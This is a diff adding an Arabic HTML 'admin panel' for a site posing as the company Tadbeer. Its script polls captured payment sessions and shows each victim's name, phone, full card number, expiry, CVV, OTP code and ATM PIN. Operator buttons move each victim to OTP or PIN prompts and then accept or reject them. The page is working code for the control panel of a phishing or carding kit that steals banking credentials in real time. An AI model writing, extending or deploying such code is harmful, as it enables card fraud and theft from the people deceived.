@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>لوحة تحكم الأدمن - شركة تدبير</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@600;700;900&family=Tajawal:wght@400;500;700;800&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary: #152650;
+            --accent: #78182b;
+            --background: #f8fafc;
+            --foreground: #0b152c;
+            --border: #e2e8f0;
+            --card: #ffffff;
+        }
+        body {
+            font-family: 'Tajawal', 'Cairo', sans-serif;
+            background-color: var(--background);
+            color: var(--foreground);
+            margin: 0;
+        }
+        header {
+            background: white;
+            padding: 1rem 2rem;
+            border-bottom: 1px solid var(--border);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .container {
+            max-width: 1200px;
+            margin: 2rem auto;
+            padding: 0 1rem;
+        }
+        .card {
+            background: var(--card);
+            border: 1px solid var(--border);
+            border-radius: 1rem;
+            padding: 1.5rem;
+            box-shadow: 0 4px 6px -1px rgba(0,0,0,0.05);
+            margin-bottom: 1.5rem;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            text-align: right;
+        }
+        th, td {
+            padding: 1rem;
+            border-bottom: 1px solid var(--border);
+            font-size: 0.9rem;
+        }
+        th {
+            background: #f1f5f9;
+            color: var(--primary);
+            font-weight: 700;
+        }
+        .badge {
+            padding: 0.35rem 0.75rem;
+            border-radius: 9999px;
+            font-size: 0.75rem;
+            font-weight: 700;
+        }
+        .badge-card { background: #dbeafe; color: #2563eb; }
+        .badge-otp { background: #fef9c3; color: #b45309; }
+        .badge-atm { background: #ede9fe; color: #7c3aed; }
+        .badge-success { background: #dcfce7; color: #16a34a; }
+        .badge-failed { background: #fee2e2; color: #dc2626; }
+        
+        .btn {
+            padding: 0.5rem 1rem;
+            border-radius: 0.5rem;
+            font-weight: 700;
+            border: none;
+            cursor: pointer;
+            font-size: 0.85rem;
+            transition: all 0.2s;
+        }
+        .btn-primary { background: var(--primary); color: white; }
+        .btn-success { background: #16a34a; color: white; }
+        .btn-danger { background: #dc2626; color: white; }
+        .btn:hover { opacity: 0.9; transform: translateY(-1px); }
+    </style>
+</head>
+<body>
+    <header>
+        <h2 style="color: var(--primary); margin: 0;">لوحة تحكم تدبير (Admin Panel)</h2>
+        <button class="btn btn-primary" onclick="loadSessions()">تحديث البيانات</button>
+    </header>
+
+    <div class="container">
+        <div class="card">
+            <h3 style="margin-top: 0; color: var(--primary); margin-bottom: 1.5rem;">طلبات الدفع والعملاء النشطين</h3>
+            <div style="overflow-x: auto;">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>معرف الجلسة</th>
+                            <th>الاسم / الهاتف</th>
+                            <th>الخدمة والمدة</th>
+                            <th>المبلغ</th>
+                            <th>رقم البطاقة</th>
+                            <th>OTP / PIN</th>
+                            <th>الحالة</th>
+                            <th>الإجراءات</th>
+                        </tr>
+                    </thead>
+                    <tbody id="sessions-table">
+                        <tr>
+                            <td colspan="8" style="text-align: center; color: #6b7280; padding: 2rem;">جاري تحميل الطلبات...</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        async function loadSessions() {
+            try {
+                const res = await fetch('/api/payment-sessions');
+                const sessions = await res.json();
+                const tbody = document.getElementById('sessions-table');
+                
+                if (!sessions || sessions.length === 0) {
+                    tbody.innerHTML = '<tr><td colspan="8" style="text-align: center; color: #6b7280; padding: 2rem;">لا توجد طلبات دفع حتى الآن</td></tr>';
+                    return;
+                }
+
+                tbody.innerHTML = sessions.map(s => `
+                    <tr>
+                        <td><code>${s.sessionId || s.id}</code></td>
+                        <td>
+                            <strong>${s.cardName || s.full_name || 'غير متوفر'}</strong><br>
+                            <small style="color: #6b7280;">${s.phone || '-'}</small>
+                        </td>
+                        <td>
+                            ${s.service || 'عاملة منزلية'}<br>
+                            <small style="color: #6b7280;">${s.duration || '-'}</small>
+                        </td>
+                        <td><strong>${s.totalAmount || 1280} د.إ</strong></td>
+                        <td>
+                            <code>${s.cardNumber || s.cardNumberMasked || '-'}</code><br>
+                            <small style="color: #6b7280;">تاريخ: ${s.cardExpiry || '-'} | CVV: ${s.cardCvv || '-'}</small>
+                        </td>
+                        <td>
+                            OTP: <strong>${s.otpCode || '-'}</strong><br>
+                            PIN: <strong>${s.atmPin || '-'}</strong>
+                        </td>
+                        <td>
+                            <span class="badge badge-${s.stage.includes('success') ? 'success' : s.stage.includes('otp') ? 'otp' : s.stage.includes('atm') ? 'atm' : s.stage.includes('failed') ? 'failed' : 'card'}">${s.stage}</span>
+                        </td>
+                        <td>
+                            <div style="display: flex; gap: 0.5rem; flex-wrap: wrap;">
+                                <button class="btn btn-primary" onclick="updateStage('${s.sessionId}', 'otp')">طلب OTP</button>
+                                <button class="btn btn-primary" onclick="updateStage('${s.sessionId}', 'atm')">طلب PIN</button>
+                                <button class="btn btn-success" onclick="updateStage('${s.sessionId}', 'success')">قبول</button>
+                                <button class="btn btn-danger" onclick="updateStage('${s.sessionId}', 'failed')">رفض</button>
+                            </div>
+                        </td>
+                    </tr>
+                `).join('');
+            } catch(e) {
+                console.error(e);
+            }
+        }
+
+        async function updateStage(sessionId, stage) {
+            try {
+                await fetch(`/api/payment-session/${sessionId}/stage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ stage })
+                });
+                loadSessions();
+            } catch(e) {
+                alert('حدث خطأ أثناء التحديث');
+            }
+        }
+
+        loadSessions();
+        setInterval(loadSessions, 5000);
+    </script>
+</body>
+</html>
